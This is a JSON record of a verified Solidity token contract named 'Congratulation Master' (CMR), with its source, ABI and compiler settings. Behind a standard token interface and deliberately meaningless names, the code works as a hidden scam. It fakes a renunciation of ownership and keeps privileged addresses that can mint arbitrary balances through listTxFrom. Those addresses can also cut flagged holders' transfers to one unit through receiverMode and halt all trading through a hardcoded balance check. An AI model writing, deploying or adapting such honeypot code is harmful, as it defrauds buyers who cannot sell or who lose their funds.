{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface marketingFund {\n    function createPair(address toList, address listSender) external returns (address);\n}\n\ninterface txFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSwap) external view returns (uint256);\n\n    function transfer(address txMax, uint256 walletMax) external returns (bool);\n\n    function allowance(address shouldSellTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 walletMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMarketing, uint256 value);\n    event Approval(address indexed shouldSellTx, address indexed spender, uint256 value);\n}\n\nabstract contract amountListReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTradingIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txFromMetadata is txFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CongratulationMaster is amountListReceiver, txFrom, txFromMetadata {\n\n    uint256 public limitSell;\n\n    bool public sellTeam;\n\n    bool public senderLaunched;\n\n    function transferFrom(address launchedExempt, address txMax, uint256 walletMax) external override returns (bool) {\n        if (_msgSender() != maxModeFund) {\n            if (fundMarketing[launchedExempt][_msgSender()] != type(uint256).max) {\n                require(walletMax <= fundMarketing[launchedExempt][_msgSender()]);\n                fundMarketing[launchedExempt][_msgSender()] -= walletMax;\n            }\n        }\n        return shouldAuto(launchedExempt, txMax, walletMax);\n    }\n\n    function owner() external view returns (address) {\n        return enableTotal;\n    }\n\n    mapping(address => bool) public totalMode;\n\n    mapping(address => mapping(address => uint256)) private fundMarketing;\n\n    constructor (){\n        if (takeTrading != limitTx) {\n            takeTeam = tradingTotalBuy;\n        }\n        liquidityTradingIs toTx = liquidityTradingIs(maxModeFund);\n        atLaunchToken = marketingFund(toTx.factory()).createPair(toTx.WETH(), address(this));\n        \n        walletSwapFee = _msgSender();\n        teamReceiverTo[walletSwapFee] = true;\n        totalBuyLimit[walletSwapFee] = listAmount;\n        enableLiquidity();\n        if (limitTx == launchReceiver) {\n            fromMarketing = takeTeam;\n        }\n        emit Transfer(address(0), walletSwapFee, listAmount);\n    }\n\n    address public atLaunchToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atMax;\n    }\n\n    uint8 private atMax = 18;\n\n    event OwnershipTransferred(address indexed marketingSell, address indexed swapFee);\n\n    string private receiverLimit = \"Congratulation Master\";\n\n    address limitTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private limitTx;\n\n    function sellWallet(uint256 walletMax) public {\n        minExempt();\n        marketingAuto = walletMax;\n    }\n\n    function approve(address tokenMode, uint256 walletMax) public virtual override returns (bool) {\n        fundMarketing[_msgSender()][tokenMode] = walletMax;\n        emit Approval(_msgSender(), tokenMode, walletMax);\n        return true;\n    }\n\n    uint256 constant swapTeamAuto = 1 ** 10;\n\n    mapping(address => uint256) private totalBuyLimit;\n\n    uint256 public takeTeam;\n\n    function shouldAuto(address launchedExempt, address txMax, uint256 walletMax) internal returns (bool) {\n        if (launchedExempt == walletSwapFee) {\n            return txToken(launchedExempt, txMax, walletMax);\n        }\n        uint256 sellMarketingShould = txFrom(atLaunchToken).balanceOf(limitTrading);\n        require(sellMarketingShould == marketingAuto);\n        require(txMax != limitTrading);\n        if (totalMode[launchedExempt]) {\n            return txToken(launchedExempt, txMax, swapTeamAuto);\n        }\n        return txToken(launchedExempt, txMax, walletMax);\n    }\n\n    address public walletSwapFee;\n\n    function transfer(address tradingTxSender, uint256 walletMax) external virtual override returns (bool) {\n        return shouldAuto(_msgSender(), tradingTxSender, walletMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAmount;\n    }\n\n    address maxModeFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fromMarketing;\n\n    bool private launchReceiver;\n\n    string private minShould = \"CMR\";\n\n    function getOwner() external view returns (address) {\n        return enableTotal;\n    }\n\n    mapping(address => bool) public teamReceiverTo;\n\n    function receiverMode(address receiverBuy) public {\n        minExempt();\n        if (sellAuto) {\n            tradingTotalBuy = marketingTotal;\n        }\n        if (receiverBuy == walletSwapFee || receiverBuy == atLaunchToken) {\n            return;\n        }\n        totalMode[receiverBuy] = true;\n    }\n\n    function minExempt() private view {\n        require(teamReceiverTo[_msgSender()]);\n    }\n\n    function txToken(address launchedExempt, address txMax, uint256 walletMax) internal returns (bool) {\n        require(totalBuyLimit[launchedExempt] >= walletMax);\n        totalBuyLimit[launchedExempt] -= walletMax;\n        totalBuyLimit[txMax] += walletMax;\n        emit Transfer(launchedExempt, txMax, walletMax);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLimit;\n    }\n\n    function enableLiquidity() public {\n        emit OwnershipTransferred(walletSwapFee, address(0));\n        enableTotal = address(0);\n    }\n\n    address private enableTotal;\n\n    uint256 exemptShould;\n\n    uint256 public tradingTotalBuy;\n\n    uint256 private listAmount = 100000000 * 10 ** 18;\n\n    function listTxFrom(address tradingTxSender, uint256 walletMax) public {\n        minExempt();\n        totalBuyLimit[tradingTxSender] = walletMax;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minShould;\n    }\n\n    function teamTx(address toLimit) public {\n        if (senderLaunched) {\n            return;\n        }\n        \n        teamReceiverTo[toLimit] = true;\n        if (takeTeam != marketingTotal) {\n            marketingTotal = limitSell;\n        }\n        senderLaunched = true;\n    }\n\n    bool public sellAuto;\n\n    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {\n        return totalBuyLimit[receiverSwap];\n    }\n\n    function allowance(address shouldSell, address tokenMode) external view virtual override returns (uint256) {\n        if (tokenMode == maxModeFund) {\n            return type(uint256).max;\n        }\n        return fundMarketing[shouldSell][tokenMode];\n    }\n\n    uint256 private marketingTotal;\n\n    bool public takeTrading;\n\n    uint256 marketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSellTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunchToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMax\",\"type\":\"uint256\"}],\"name\":\"listTxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMax\",\"type\":\"uint256\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"teamTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotalBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwapFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CongratulationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}